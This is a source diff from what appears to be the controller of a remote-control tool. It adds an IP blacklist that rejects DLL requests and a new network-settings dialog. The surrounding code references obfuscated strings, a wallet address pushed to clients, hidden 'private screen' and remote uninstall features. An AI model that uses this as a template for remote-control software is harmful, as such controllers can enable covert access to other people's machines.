@@ -31,6 +31,7 @@
 #include <proxy/ProxyMapDlg.h>
 #include "common/DateVerify.h"
 #include "common/IPWhitelist.h"
+#include "common/IPBlacklist.h"
 #include <fstream>
 #include <iomanip>
 #include "common/skCrypter.h"
@@ -47,6 +48,7 @@
 #include <file/CFileManagerDlg.h>
 #include "CDrawingBoard.h"
 #include "CWalletDlg.h"
+#include "NetworkDlg.h"
 #include <wallet.h>
 #include "CRcEditDlg.h"
 #include <thread>
@@ -561,6 +563,18 @@ bool CMy2015RemoteDlg::IsDllRequestLimited(const std::string& ip)
         return false;
     }
 
+    // 黑名单 IP 直接拒绝
+    if (IPBlacklist::getInstance().IsBlacklisted(ip)) {
+        // 防刷频日志
+        if (IPBlacklist::getInstance().ShouldLog(ip)) {
+            Mprintf("'%s' DLL request rejected (blacklisted)\n", ip.c_str());
+            char tip[256];
+            sprintf_s(tip, _TRF("IP %s DLL 请求被拒绝 (黑名单)"), ip.c_str());
+            PostMessageA(WM_SHOWERRORMSG, (LPARAM)new CString(tip), (WPARAM)new CString(_TR("黑名单")));
+        }
+        return true;
+    }
+
     CLock lock(m_DllRateLimitLock);
     time_t now = time(nullptr);
     time_t cutoff = now - DLL_RATE_LIMIT_SECONDS;
@@ -707,6 +721,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_NOTIFY(NM_CUSTOMDRAW, IDC_ONLINE, &CMy2015RemoteDlg::OnNMCustomdrawOnline)
     ON_COMMAND(ID_ONLINE_RUN_AS_ADMIN, &CMy2015RemoteDlg::OnOnlineRunAsAdmin)
     ON_COMMAND(ID_MAIN_WALLET, &CMy2015RemoteDlg::OnMainWallet)
+    ON_COMMAND(ID_MAIN_NETWORK, &CMy2015RemoteDlg::OnMainNetwork)
     ON_COMMAND(ID_TOOL_RCEDIT, &CMy2015RemoteDlg::OnToolRcedit)
     ON_COMMAND(ID_ONLINE_UNINSTALL, &CMy2015RemoteDlg::OnOnlineUninstall)
     ON_COMMAND(ID_ONLINE_PRIVATE_SCREEN, &CMy2015RemoteDlg::OnOnlinePrivateScreen)
@@ -6320,6 +6335,13 @@ void CMy2015RemoteDlg::OnMainWallet()
     strcpy(m_settings.WalletAddress, dlg.m_str);
     THIS_CFG.SetStr("settings", "wallet", m_settings.WalletAddress);
     SendMasterSettings(nullptr, m_settings);
+}
+
+
+void CMy2015RemoteDlg::OnMainNetwork()
+{
+    CNetworkDlg dlg(this);
+    dlg.DoModal();
 }
 
 
